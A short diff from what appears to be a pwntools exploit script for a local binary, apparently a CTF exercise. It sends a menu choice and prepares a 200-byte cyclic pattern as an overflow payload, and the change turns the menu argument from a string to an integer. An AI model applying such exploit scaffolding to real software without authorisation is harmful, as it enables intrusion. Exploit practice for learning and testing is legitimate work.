@@ -22,7 +22,7 @@ log.info('Create IO')
 io = process(executable)
 
 log.info('Send Command')
-io.sendlineafter('>', '2')
+io.sendlineafter('>', 2)
 
 payload = cyclic(200)
 
